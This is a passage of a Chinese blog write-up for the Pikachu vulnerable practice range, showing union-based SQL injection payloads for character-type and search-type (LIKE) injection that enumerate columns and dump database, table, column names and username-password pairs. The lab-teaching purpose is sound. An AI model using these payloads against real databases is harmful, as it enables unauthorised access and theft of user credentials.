pikachu。前者是所有库名，后者是查询当前所使用的数据库】<br>id=0&#x27; union select 1,group_concat(schema_name) from information_schema.schemata#<br>## 或者<br>id=0&#x27; union select 1,database()#<br><br># 爆表名。【得到表名 ...users...】<br>id=0&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# <br><br># 爆列名。【得到列名 ...username,password...】<br>id=0&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;#<br><br># 爆值。【得到用户名-密码对】<br>id=0&#x27; union select 1,group_concat(username,&#x27;-&#x27;,password) from users#<br></code></pre></td></tr></table></figure>
+<h3 id="搜索型注入"><a class="markdownIt-Anchor" href="#搜索型注入"></a> 搜索型注入</h3>
+<ul>
+<li>使用上面的字符型注入方法也可实现注入，不过既然是新题，就考虑新的绕过方式。本题使用的查询语句为：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select username,id,email from member where username like &#x27;%$name%&#x27;<br></code></pre></td></tr></table></figure>
+<ul>
+<li>所以 payload 为：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs mysql"># 确定字段（列）数。【后者报错，说明字段（列）数为 3】<br>id=1%&#x27; order by 3#<br>id=1%&#x27; order by 4# <br><br># 联合查询查看显示位。【有三个显示位】<br>id=0%&#x27; union select 1,2,3# <br><br># 爆库名。【得到库名 pikachu。前者是所有库名，后者是查询当前所使用的数据库】<br>id=0%&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata#<br>## 或者<br>id=0%&#x27; union select 1,2,database()#<br><br># 爆表名。【得到表名 ...users...】<br>id=0%&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()# <br><br># 爆列名。【得到列名 ...username,password...】<br>id=0%&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;#<br><br># 爆值。【得到用户名-密码对】<br>id=0%&#x27; union select 1,2,group_concat(username,&#x27;-&#x27;,password) from users#<br></code></pre></td></tr></table></figure>
+<div class="note note-success">
+            <p>输入 id = %%，能够查询表中非 NULL 的值。这是因为 <code>like '%%'</code>默认为查询所有。(即 % 为通配符)</p>
+          </div>
+<h3 id="xx型注入"><a class="markdownIt-Anchor" href="#xx型注入"></a> xx型注入</h3>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Writeup/" class="category-chain-item">Writeup</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+        <a href="/tags/Pikachu/" class="print-no-link">#Pikachu</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Pikachu 靶场 Writeup</div>
+      <div>https://justloseit.top/Pikachu 靶场 Writeup/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Mobilis In Mobili</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2021年11月29日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2022年11月21日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93%EF%BC%9A2021%E5%B9%B4%E6%88%91%E7%9A%84%E9%98%85%E8%AF%BB%C2%B7%E5%BD%B1%E8%A7%86%C2%B7%E6%B8%B8%E6%88%8F/" title="年度总结：2021年我的阅读·影视·游戏">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">年度总结：2021年我的阅读·影视·游戏</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/%E8%AE%BA%E4%B8%91%E8%A7%92%E7%B2%BE%E7%A5%9E/" title="论丑角精神">
+                        <span class="hidden-mobile">论丑角精神</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"t4w421aIGl2GXkT0tSGoap5I-gzGzoHsz","appKey":"BpNeeVt0v3tKAbF1L6RTf94X","path":"window.location.pathname","placeholder":"说点什么","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":false,"serverURLs":"https://t4w421ai.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      <a target="_blank" rel="noopener" href="https://beian.miit.gov.cn">京ICP备2021006744号-1</a>
+    </a>
+  </span>
+  
+    
+      <span>
+        <a
+          href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=11010802034644"
+          rel="nofollow noopener"
+          class="beian-police"
+          target="_blank"
+        >
+          
+            <span style="visibility: hidden; width: 0">|</span>
+            <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
+          
+          <span>京公网安备 11010802034644号</span>
+        </a>
+      </span>
+    
+  
+</div>
+
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
